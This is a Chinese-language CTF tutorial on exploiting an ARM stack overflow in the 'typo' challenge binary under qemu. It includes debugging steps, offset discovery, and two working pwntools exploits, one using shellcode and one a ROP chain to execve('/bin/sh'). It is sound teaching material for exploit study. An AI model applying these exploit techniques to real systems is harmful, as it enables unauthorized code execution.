# ARM Stack OverFlow


## 0x00 ARM PWN 知识准备

### ARM 函数调用约定
ARM 32位：   
- 参数1-参数4 分别保存到 R0-R3 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 R0 中。 
- ARM中使用R0作为默认的返回值。
ARM 64位：   
-  参数1-参数8 分别保存到 X0-X7 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 X0 中。   

[常见函数调用约定(x86、x64、arm、arm64)](https://bbs.pediy.com/thread-224583.htm)
### Qemu 调试
>在1234端口开启gdbserver `-g` 1234    

`qemu-arm -g 1234 ./binary` 

>gdb-multiarch连接gdbserver
```
gdb-multiarch 
pwndbg> set architecture arm
pwndbg> set endian little
pwndbg> target remote 127.0.0.1:1234
```

### ARM 汇编

- [mips_arm汇编学习](https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi)


## 0x01 PWN

### 1.题目

Binary： [typo](./typo)

1. ret2shellcode：通过shellcode解题，通过栈溢出利用，获取RCE。   
2. rop：通过构造rop解题，通过栈溢出利用，获取RCE。 

> 开了NX，但是qemu不支持nx，相当于没开启。  
```
$ pwn checksec  ./typo
[*] '/home/mi/CTF/pwn-exercise/linux_arm_stack/arm_pwn_typo/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```
32位 ARM ELF
```
$ file typo
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
```

### 2.分析

####  运行
```
$ qemu-arm  ./typo
Let's Do Some Typing Exercise~
Press Enter to get start;
Input ~ if you want to quit

------Begin------
yearly

```
- 输入点1：通过简单的测试运行，如果不输入指定字符（`\n`），会退出，这无法产生溢出。  
- 输入点2：回车后，可再次输入，过长字符产生`Segmentation fault (core dumped)`报错，可以判定这个为溢出点。    

#### 逆向
v6参数为输入点2，存在栈溢出漏洞。   

```
signed int __fastcall sub_8D24(int a1)
{
  int v1; // r0
  int v2; // r4
  int v5; // [sp+4h] [bp-78h]
  char v6; // [sp+Ch] [bp-70h]

  v5 = a1;
  sub_20AF0(&v6, 0, 100);
  sub_221B0(0, &v6, 512);
  v1 = sub_1F800(v5);
  if ( !sub_1F860(v5, &v6, v1) )
  {
    v2 = sub_1F800(v5);
    if ( v2 == sub_1F800(&v6) - 1 )
      return 1;
  }
  if ( v6 == 126 )
    return 2;
  return 0;
}
```

#### 调试
>启动调试：`qemu-arm -g 1234 ./typo`

推荐断点位置  0x00008DE8 溢出后ret跳转处。   
```
gdb-multiarch 
pwndbg> set architecture arm
pwndbg> set endian little
pwndbg> target remote 127.0.0.1:1234
```
#### 判断溢出长度
通过pwntools cyclic工来判断溢出长度，通过规则的字符串输入，再根据ret的地址字符来比对，判断溢出长度。   

```
>>> from pwn import *
>>> cyclic(200)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
```
将上述字符串输入到输入点2，产生溢出，gdb异常断下。     
```
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────[ REGISTERS ]─────────────────────────────
 R0   0x0
*R1   0xf6ffee64 ◂— 0x61616161 ('aaaa')
*R2   0x7e
 R3   0x0
*R4   0x62616162 ('baab')
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
*R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}
*R10  0xa68c ◂— push   {r3, r4, r5, lr}
*R11  0x62616163 ('caab')
 R12  0x0
*SP   0xf6ffeed8 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
*PC   0x62616164 ('daab')
──────────────────────────────[ DISASM ]──────────────────────────────
Invalid address 0x62616164
──────────────────────────────[ STACK ]───────────────────────────────
00:0000│ sp 0xf6ffeed8 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
01:0004│    0xf6ffeedc ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
02:0008│    0xf6ffeee0 ◂— 'gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
03:000c│    0xf6ffeee4 ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
04:0010│    0xf6ffeee8 ◂— 'iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
05:0014│    0xf6ffeeec ◂— 'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
06:0018│    0xf6ffeef0 ◂— 'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
07:001c│    0xf6ffeef4 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
────────────────────────────[ BACKTRACE ]─────────────────────────────
 ► f 0 0x62616164
──────────────────────────────────────────────────────────────────────
```
PC寄存器就是ret的地址，为'daab'，以此判断padding为112。
```
>>> cyclic_find('daab')
112
```


## 0x02 EXP


### ret2shellcode

> 1. qemu栈地址可能会有变化，ret2shellcode不算稳定，需要调试看当前环境的地址空间。   
> 2. 使用pwntools的shellcraft.sh如果报错，arm不支持，解决： `sudo apt-get install binutils-arm*`

exp file : [exp.py](./exp.py)
```
from  pwn import *

context(arch='arm',log_level='debug')
io = process(['qemu-arm','./typo'])
#io = process(['qemu-arm',"-g","1234",'./typo'])

io.recv()
io.send("\n")
io.recv()
io.sendline(asm(shellcraft.sh()).ljust(112,b'a') + p32(0xf6fff174))
io.interactive()
```

### rop
`svc：id=0xb；R0=addr(“/bin/sh”)；R1=0；R2=0`  
以上系统调用等同于execve(“/bin/sh”,0,0)     

> svc: 通过这条指令切换到 svc 模式（svc 替代了以前的 swi 指令，是 ARM 提供的系统调用指令），进入到软件中断处理函数（ SWI handler ）。   

所以我们RoP目标状态如下：   

- R0 = “/bin/sh”
- R1 = 0
- R2 = 0
- R7 = 0xb （对应arm下execve的系统调用）
- svc

1. `/bin/sh`字符串地址：0x0006c384
```
$ROPgadget --binary ./typo --string /bin/sh
Strings information
============================================================
0x0006c384 : /bin/sh
```
2. rop  
> 在这里 pc 相当于x86的ret，构成gadget。  
```
0x00020904 : pop {r0, r4, pc}   
0x00068bec : pop {r1, pc}   
0x00014068 : pop {r7, pc}   
```
没有r2寄存器gadget，需要通过mov方式赋值，我们这有r4的，找个 `mov r2 , r4`。

```
$ ROPgadget --binary ./typo --only "pop"
Gadgets information
============================================================
0x00008d1c : pop {fp, pc}
0x00020904 : pop {r0, r4, pc}
0x00068bec : pop {r1, pc}
0x00008160 : pop {r3, pc}
0x0000ab0c : pop {r3, r4, r5, pc}
0x0000a958 : pop {r3, r4, r5, r6, r7, pc}
0x00008a3c : pop {r3, r4, r5, r6, r7, r8, fp, pc}
0x0000a678 : pop {r3, r4, r5, r6, r7, r8, sb, pc}
0x00008520 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x00068c68 : pop {r3, r4, r5, r6, r7, r8, sl, pc}
0x00014a70 : pop {r3, r4, r7, pc}
0x00008de8 : pop {r4, fp, pc}
0x000083b0 : pop {r4, pc}
0x00008eec : pop {r4, r5, fp, pc}
0x00009284 : pop {r4, r5, pc}
0x000242e0 : pop {r4, r5, r6, fp, pc}
0x000095b8 : pop {r4, r5, r6, pc}
0x000212ec : pop {r4, r5, r6, r7, fp, pc}
0x000082e8 : pop {r4, r5, r6, r7, pc}
0x00043110 : pop {r4, r5, r6, r7, r8, fp, pc}
0x00011648 : pop {r4, r5, r6, r7, r8, pc}
0x00048e9c : pop {r4, r5, r6, r7, r8, sb, fp, pc}
0x0000a5a0 : pop {r4, r5, r6, r7, r8, sb, pc}
0x0000870c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
0x00011c24 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
0x000553cc : pop {r4, r5, r6, r7, r8, sl, pc}
0x00023ed4 : pop {r4, r5, r7, pc}
0x00023dbc : pop {r4, r7, pc}
0x00014068 : pop {r7, pc}

Unique gadgets found: 29
```
3. `mov r2, r4`
挑选 `0x0003338c : mov r2, r4 ; blx r3`,通过blx再跳转，这需要给r3寄存器赋值，再找个`pop r3` (`0x00008160 : pop {r3, pc}`)。
```
$ ROPgadget --binary ./typo | grep "mov r2, r4"
0x0003338c : mov r2, r4 ; blx r3
```

4. svc
```
$ ROPgadget --binary ./typo | grep 'svc #0'
0x0001aca8 : svc #0 ; pop {r4, r5, r6, r7, r8, pc}
0x00019568 : svc #0 ; pop {r4, r5, r6, r7, r8, sb, pc}
0x000482fc : svc #0 ; pop {r7} ; bx lr
0x00048310 : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! 
0x000482fc : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! 
0x00048324 : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! 
```




5. RoP链
执行svc时候的寄存器状态   
- R0 = “/bin/sh”
- R1 = 0
- R2 = 0
- R7 = 0xb （对应arm下execve的系统调用）
- svc
RoP链：
```
0x00068bec : pop {r1, pc}
0
0x00020904 : pop {r0, r4, pc}   
0x0006c384 : /bin/sh
0
0x00014068 : pop {r7, pc}  
0xb
0x00008160 : pop {r3, pc}
0x000482fc : svc #0 ; pop {r7} ; bx lr
0x0003338c : mov r2, r4 ; blx r3
```

exp file : [./exp_rop.py](./exp_rop.py)
```
from pwn import *
context(arch='arm',log_level='debug')
io = process(['qemu-arm','./typo'])
#io = process(['qemu-arm',"-g","1234",'./typo'])

io.recv()
io.send("\n")
io.recv()

payload = b'a'*112
payload += p32(0x00068bec) #pop {r1, pc}
payload += p32(0)
payload += p32(0x00020904) #pop {r0, r4, pc} 
payload += p32(0x0006c384) #/bin/sh
payload += p32(0)
payload += p32(0x00014068) #pop {r7, pc} 
payload += p32(0xb)
payload += p32(0x00008160) #pop {r3, pc}
payload += p32(0x000482fc) #svc #0 ; pop {r7} ; bx lr
payload += p32(0x0003338c) #mov r2, r4 ; blx r3

io.sendline(payload)
io.interactive()
```


## Ref

- https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/
